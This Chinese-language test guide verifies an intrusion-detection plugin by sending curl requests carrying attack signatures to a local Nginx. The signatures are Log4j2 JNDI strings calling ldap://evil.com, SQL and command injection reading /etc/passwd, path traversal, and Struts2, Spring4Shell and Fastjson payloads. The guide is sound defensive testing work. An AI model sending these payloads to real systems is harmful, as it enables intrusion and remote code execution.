# NIDS 网络攻击检测 — 测试指南

## 测试目标

验证 nids 插件的网络入侵检测功能（DataType 6007）：通过 gopacket 抓取网卡流量，TCP 流重组后解析 HTTP 请求，将请求的 URI、Header、Body 等字段与 Suricata 格式规则进行匹配，匹配成功时产生告警。本文档选取 10 条代表性规则进行验证，覆盖 content、content+nocase、pcre 三种匹配方式，涵盖 http.uri、http.header、http.request_body 三种匹配缓冲区，以及 critical、high、medium 三种严重程度。

**检测流程**：curl 发送攻击请求 → Nginx 接收 → lo 网卡产生流量 → gopacket 抓包 → TCP 流重组 → HTTP 解析 → 规则匹配 → 产生告警

**流量模拟方式**：使用 curl 向本机 Nginx（127.0.0.1:80）发送包含攻击特征的 HTTP 请求。流量经过 lo 接口，nids 插件配置为抓取 lo 接口流量，从而实现完整的网络层检测验证。无需预录 PCAP 文件或第三方流量回放工具。

## 前置条件

| # | 检查项 | 检查命令 | 通过标准 |
|---|--------|---------|---------|
| 1 | 操作系统 | `uname -s` | 输出 `Linux` |
| 2 | root 权限 | `whoami` | 输出 `root` |
| 3 | 编译环境 | `go version` | Go 已安装 |
| 4 | libpcap | `ldconfig -p \| grep libpcap` | 输出包含 `libpcap` |
| 5 | Nginx 运行 | `curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1/` | 输出 `200` 或 `3xx` |
| 6 | lo 接口 | `ip link show lo` | 接口存在且 state UP |

如果条件 5 不满足，执行 `sudo systemctl start nginx` 或 `sudo apt install nginx && sudo systemctl start nginx` 后重新检查。

如果任一其他条件不满足，测试无法进行。

---

## Step 1：编译部署

```bash
cd /home/work/goProject/src/company/agent
make build
make deploy
```

**验证**：执行 `ls -la /opt/cloudsec/agent/bin/agent /opt/cloudsec/agent/plugins/nids/nids`，两个文件都存在即成功。

**验证规则文件**：执行 `ls -la /opt/cloudsec/agent/plugins/nids/config/nids.rules`，文件存在且非空。

---

## Step 2：启动 Agent

打开 **Terminal A**，执行：

```bash
cd /opt/cloudsec/agent
sudo ./bin/agent -standalone -plugins=nids -output=stderr -test
```

### 启动成功判定

在 Terminal A 的 stderr 输出中，**必须**依次看到以下日志行：

```
2026-xx-xxTxx:xx:xx.xxx+0800  INFO  nids/main.go:23   Starting NIDS plugin...
2026-xx-xxTxx:xx:xx.xxx+0800  INFO  nids/main.go:32   Config loaded          interface=lo  bpf_filter=tcp port 80 or tcp port 8080  ...
2026-xx-xxTxx:xx:xx.xxx+0800  INFO  nids/main.go:46   Suricata rules loaded  count=20  path=config/nids.rules
2026-xx-xxTxx:xx:xx.xxx+0800  INFO  nids/main.go:62   Packet capture initialized  interface=lo  bpf_filter=tcp port 80 or tcp port 8080
```

**判定规则**：
- `Suricata rules loaded  count=20` → 启动成功，20 条规则全部加载，进入 Step 3
- `count=0` 或该行未出现 → 启动失败，检查 `nids.rules` 是否在 `/opt/cloudsec/agent/plugins/nids/config/` 目录下
- `Failed to create packet capture` 错误 → 无 root 权限或 libpcap 缺失，检查前置条件 2、4
- `Failed to load config` 错误 → 检查 `nids.yaml` 是否在 `/opt/cloudsec/agent/plugins/nids/config/` 目录下

### 日志位置

| 位置 | 说明 |
|------|------|
| Terminal A (stderr) | 实时输出，**主要观察位置** |
| `/opt/cloudsec/agent/logs/plugins/nids/nids.log` | 同内容持久化文件，可用 grep 搜索 |

### 搜索技巧

如果 Terminal A 输出内容较多，可使用 grep 过滤：

```bash
# 方式一：启动时只显示告警（Terminal A）
sudo ./bin/agent -standalone -plugins=nids -output=stderr -test 2>&1 | grep "Attack detected"

# 方式二：保存全部输出到文件，在另一个终端搜索
sudo ./bin/agent -standalone -plugins=nids -output=stderr -test 2>&1 | tee /tmp/nids_test.log
# 另一个终端
grep "Attack detected" /tmp/nids_test.log

# 方式三：按 SID 精确搜索
grep "sid=1001" /tmp/nids_test.log
```

---

## Step 3：执行测试用例

打开 **Terminal B**，逐条执行以下 curl 命令。每执行一条后，回到 Terminal A 查看是否出现对应告警。

> **流量原理**：curl 向 127.0.0.1 的 Nginx 发送 HTTP 请求，流量经过 lo 接口。nids 插件抓取 lo 接口流量，完成 TCP 流重组和 HTTP 解析后进行规则匹配。

### 告警日志格式

每条告警在 Terminal A 中以一行 **WARN 级别**结构化日志输出：

```
2026-xx-xxTxx:xx:xx.xxx+0800  WARN  nids/detector.go:161  Attack detected  sid={ID}  msg={描述}  severity={级别}  src_ip={来源IP}  dst_port={端口}  uri={URI}  count={攻击计数}
```

### 通用判定规则

**PASS** 条件（全部满足）：
1. Terminal A 出现包含 `Attack detected` 的 WARN 日志行
2. `sid` 与测试用例的规则 ID 一致
3. `msg` 与规则描述一致
4. `severity` 与预期严重程度一致

**FAIL** 条件（任一满足）：
- 执行 curl 后 5 秒内 Terminal A 无任何 `Attack detected` 输出
- `sid` 与预期不一致

---

### 用例 1：SID 1001 — Log4j2 JNDI 注入 Header（critical）

**匹配方式**：content + nocase，匹配 `${jndi:`，缓冲区 http.header

**测试命令**（Terminal B）：

```bash
curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' http://127.0.0.1/
```

**预期日志**（Terminal A）：

```
WARN  Attack detected  sid=1001  msg=ET EXPLOIT Apache Log4j2 RCE - JNDI Injection in Header  severity=critical  src_ip=127.0.0.1  dst_port=80  uri=/  count=1
```

**PASS 判定**：出现 `Attack detected`，且 `sid=1001`，`severity=critical`。

---

### 用例 2：SID 1002 — Log4j2 JNDI 注入 URI（critical）

**匹配方式**：content + nocase，匹配 `${jndi:`，缓冲区 http.uri

**测试命令**（Terminal B）：

```bash
curl -s -o /dev/null -g --path-as-is 'http://127.0.0.1/${jndi:ldap://evil.com/a}'
```

**预期日志**（Terminal A）：

```
WARN  Attack detected  sid=1002  msg=ET EXPLOIT Apache Log4j2 RCE - JNDI Injection in URI  severity=critical  src_ip=127.0.0.1  dst_port=80  uri=/${jndi:ldap://evil.com/a}  count=1
```

**PASS 判定**：出现 `Attack detected`，且 `sid=1002`，`severity=critical`。

> 说明：必须加 `-g` 参数，否则 curl 会将 `{` `}` 当作 URL globbing 语法处理，导致实际发送的 URI 中 `${}` 被破坏。

---

### 用例 3：SID 2001 — SQL 注入 UNION SELECT（high）

**匹配方式**：pcre，匹配 `/union\s+(all\s+)?select\s+/i`，缓冲区 http.uri

**测试命令**（Terminal B）：

```bash
curl -s -o /dev/null 'http://127.0.0.1/api?id=1%20UNION%20SELECT%201,2,3'
```

**预期日志**（Terminal A）：

```
WARN  Attack detected  sid=2001  msg=SQL Injection - UNION SELECT in URI  severity=high  src_ip=127.0.0.1  dst_port=80  uri=/api?id=1 UNION SELECT 1,2,3  count=1
```

**PASS 判定**：出现 `Attack detected`，且 `sid=2001`，`severity=high`。

> 说明：`%20` 是空格的 URL 编码，nids 会在匹配前进行 URL 解码，因此 `UNION SELECT` 能被 PCRE 规则正确匹配。日志中 `uri` 字段显示的是解码后的内容。

---

### 用例 4：SID 3001 — 命令注入 URI（critical）

**匹配方式**：pcre，匹配 `/[;|` `` ` `` `]\s*(cat|id|whoami|...)\s/`，缓冲区 http.uri

**测试命令**（Terminal B）：

```bash
curl -s -o /dev/null 'http://127.0.0.1/api?cmd=%3bcat%20/etc/passwd'
```

**预期日志**（Terminal A）：

```
WARN  Attack detected  sid=3001  msg=OS Command Injection - Common Commands in URI  severity=critical  src_ip=127.0.0.1  dst_port=80  uri=/api?cmd=;cat /etc/passwd  count=1
```

**PASS 判定**：出现 `Attack detected`，且 `sid=3001`，`severity=critical`。

> 说明：`%3b` 是分号的 URL 编码，解码后为 `;cat /etc/passwd`，匹配规则中的命令注入模式。

---

### 用例 5：SID 4001 + 4003 — 路径遍历（high）

**匹配方式**：SID 4001 为 content 匹配 `../etc/passwd`，SID 4003 为 pcre 匹配 `/(\.\.[\/\\]){3,}/`，缓冲区 http.uri

**测试命令**（Terminal B）：

```bash
curl -s -o /dev/null --path-as-is 'http://127.0.0.1/../../../../etc/passwd'
```

**预期日志**（Terminal A，2 条规则同时命中）：

```
WARN  Attack detected  sid=4001  msg=Path Traversal - etc/passwd Access  severity=high  ...  count=1
WARN  Attack detected  sid=4003  msg=Path Traversal - Deep Traversal     severity=high  ...  count=1
```

**PASS 判定**：出现 2 条 `Attack detected`，`sid=4001` 和 `sid=4003` 各一条。

> 说明：必须加 `--path-as-is`，否则 curl 会自动将 `../../../../etc/passwd` 规范化为 `/etc/passwd`，导致 `../` 特征消失。

---

### 用例 6：SID 5001 — Struts2 OGNL 注入（critical）

**匹配方式**：content，匹配 `%{`，缓冲区 http.uri

**测试命令**（Terminal B）：

```bash
curl -s -o /dev/null --path-as-is 'http://127.0.0.1/test%25%7B1+1%7D'
```

**预期日志**（Terminal A）：

```
WARN  Attack detected  sid=5001  msg=Apache Struts2 RCE - OGNL Injection  severity=critical  src_ip=127.0.0.1  dst_port=80  uri=/test%{1+1}  count=1
```

**PASS 判定**：出现 `Attack detected`，且 `sid=5001`，`severity=critical`。

> 说明：`%25` 是 `%` 的 URL 编码，`%7B` 是 `{` 的 URL 编码。URL 解码后 URI 中包含 `%{1+1}`，匹配 OGNL 注入特征。

---

### 用例 7：SID 5002 — Spring4Shell Body（critical）

**匹配方式**：content，匹配 `class.module.classLoader`，缓冲区 http.request_body

**测试命令**（Terminal B）：

```bash
curl -s -o /dev/null -X POST -d 'class.module.classLoader.resources=test' http://127.0.0.1/
```

**预期日志**（Terminal A）：

```
WARN  Attack detected  sid=5002  msg=Spring4Shell RCE - Class Loader Manipulation  severity=critical  src_ip=127.0.0.1  dst_port=80  uri=/  count=1
```

**PASS 判定**：出现 `Attack detected`，且 `sid=5002`，`severity=critical`。

---

### 用例 8：SID 5003 — Fastjson RCE Body（critical）

**匹配方式**：pcre，匹配 `/@type.*com\.sun\./i`，缓冲区 http.request_body

**测试命令**（Terminal B）：

```bash
curl -s -o /dev/null -X POST \
  -H 'Content-Type: application/json' \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl"}' \
  http://127.0.0.1/
```

**预期日志**（Terminal A）：

```
WARN  Attack detected  sid=5003  msg=Fastjson RCE - AutoType Deserialization  severity=critical  src_ip=127.0.0.1  dst_port=80  uri=/  count=1
```

**PASS 判定**：出现 `Attack detected`，且 `sid=5003`，`severity=critical`。

---

### 用例 9：SID 6001 — SQLMap 扫描器 UA（medium）

**匹配方式**：content + nocase，匹配 `sqlmap`，缓冲区 http.header

**测试命令**（Terminal B）：

```bash
curl -s -o /dev/null -A 'sqlmap/1.0' http://127.0.0.1/
```

**预期日志**（Terminal A）：

```
WARN  Attack detected  sid=6001  msg=Scanner Detection - SQLMap User-Agent  severity=medium  src_ip=127.0.0.1  dst_port=80  uri=/  count=1
```

**PASS 判定**：出现 `Attack detected`，且 `sid=6001`，`severity=medium`。

---

### 用例 10：SID 6002 — Nmap 扫描器 UA（medium）

**匹配方式**：pcre，匹配 `/(nmap|dirbuster|nikto|masscan|zgrab)/i`，缓冲区 http.header

**测试命令**（Terminal B）：

```bash
curl -s -o /dev/null -A 'nmap scripting engine' http://127.0.0.1/
```

**预期日志**（Terminal A）：

```
WARN  Attack detected  sid=6002  msg=Scanner Detection - Nmap/Dirbuster/Nikto User-Agent  severity=medium  src_ip=127.0.0.1  dst_port=80  uri=/  count=1
```

**PASS 判定**：出现 `Attack detected`，且 `sid=6002`，`severity=medium`。

---

### 用例 11：重复攻击计数验证

**测试命令**（Terminal B）：

```bash
# 连续发送 3 次相同攻击
curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' http://127.0.0.1/
curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' http://127.0.0.1/
curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' http://127.0.0.1/
```

**预期日志**（Terminal A）：

```
WARN  Attack detected  sid=1001  ...  count=1
WARN  Attack detected  sid=1001  ...  count=2
WARN  Attack detected  sid=1001  ...  count=3
```

**PASS 判定**：`sid=1001` 的 `count` 字段依次为 1、2、3（同一 src_ip + sid 的攻击计数递增）。

---

## Step 4：记录测试结果

| # | SID | 攻击类型 | 严重程度 | 匹配方式 | 测试命令 | 预期 | 实际 | PASS/FAIL |
|---|-----|----------|----------|----------|----------|------|------|-----------|
| 1 | 1001 | Log4j2 JNDI Header | critical | content+nocase / http.header | `curl -H 'X-Api-Version: ${jndi:...}'` | 告警 | | |
| 2 | 1002 | Log4j2 JNDI URI | critical | content+nocase / http.uri | `curl -g --path-as-is '.../${jndi:...}'` | 告警 | | |
| 3 | 2001 | SQL 注入 UNION SELECT | high | pcre / http.uri | `curl '...?id=1%20UNION%20SELECT...'` | 告警 | | |
| 4 | 3001 | 命令注入 URI | critical | pcre / http.uri | `curl '...?cmd=%3bcat%20/etc/passwd'` | 告警 | | |
| 5 | 4001 | 路径遍历 etc/passwd | high | content / http.uri | `curl --path-as-is '.../../../etc/passwd'` | 告警 | | |
| 6 | 4003 | 路径遍历（深层） | high | pcre / http.uri | （同上，同时触发） | 告警 | | |
| 7 | 5001 | Struts2 OGNL 注入 | critical | content / http.uri | `curl --path-as-is '...%25%7B1+1%7D'` | 告警 | | |
| 8 | 5002 | Spring4Shell Body | critical | content / http.request_body | `curl -X POST -d 'class.module...'` | 告警 | | |
| 9 | 5003 | Fastjson RCE Body | critical | pcre / http.request_body | `curl -X POST -d '{"@type":"..."}'` | 告警 | | |
| 10 | 6001 | SQLMap 扫描器 UA | medium | content+nocase / http.header | `curl -A 'sqlmap/1.0'` | 告警 | | |
| 11 | 6002 | Nmap 扫描器 UA | medium | pcre / http.header | `curl -A 'nmap scripting engine'` | 告警 | | |
| 12 | — | 重复攻击计数 | — | — | 同一攻击连续 3 次 | count 递增 | | |

---

## Step 5：清理与停止

```bash
# 1. Terminal A：按 Ctrl+C 停止 Agent

# 2.（可选）停止 Nginx
sudo systemctl stop nginx
```

---

## 常见问题排查

| 问题现象 | 可能原因 | 排查步骤 |
|---------|---------|---------|
| Agent 启动后 nids 插件未加载 | 插件文件缺失或无执行权限 | 1) `ls -la /opt/cloudsec/agent/plugins/nids/nids` 确认文件存在且有执行权限；2) 确认启动命令包含 `-plugins=nids` |
| 启动报 `Failed to create packet capture` | 无 root 权限或 libpcap 缺失 | 1) `whoami` 确认 root；2) `ldconfig -p \| grep libpcap` 确认 libpcap 已安装 |
| 启动报 `Failed to load config` | 配置文件缺失 | `ls /opt/cloudsec/agent/plugins/nids/config/nids.yaml` 确认文件存在；检查 YAML 格式 |
| 规则加载 count=0 | 规则文件缺失或格式错误 | 1) `ls /opt/cloudsec/agent/plugins/nids/config/nids.rules` 确认文件存在；2) 检查规则文件格式是否符合 Suricata 语法 |
| curl 发送请求但无告警 | Nginx 未运行或网卡配置错误 | 1) `curl http://127.0.0.1/` 确认 Nginx 响应；2) 确认 `nids.yaml` 的 interface 为 `lo`；3) `tcpdump -i lo port 80 -c 5` 验证能抓到包 |
| 路径遍历（SID 4001/4003）未触发 | curl 自动规范化路径 | 确认 curl 加了 `--path-as-is`，否则 `../` 会被自动去除 |
| Log4j2 URI（SID 1002）未触发 | curl globbing 破坏 `${}` | 确认 curl 加了 `-g`，否则 `{` `}` 会被当作 globbing 语法处理 |
| SQL 注入/命令注入未触发 | URL 解码未生效 | PCRE 规则匹配的是 URL 解码后的内容，确认 nids 的 URL 解码功能正常；检查日志中 `uri` 字段是否包含解码后的内容 |
| 跨机器测试无告警 | 流量不经过 lo 接口 | 将 `nids.yaml` 的 interface 改为实际网卡（如 `ens33`），重启 Agent |
| 告警出现但字段缺失 | HTTP 解析不完整 | 检查日志中 `uri` 字段；TCP 流重组可能因分片导致解析不完整，尝试增大 `nids.yaml` 中 `tcp_reassembly.stream_timeout` 的值 |
| 告警延迟超过 5 秒 | TCP 流重组等待超时 | gopacket 抓包本身无延迟，延迟来自 TCP 流重组（30 秒 flush 周期）；短连接场景下 FIN 包会触发即时重组，不应有明显延迟；若延迟严重，检查 Nginx 是否启用了 keep-alive 导致流未关闭 |
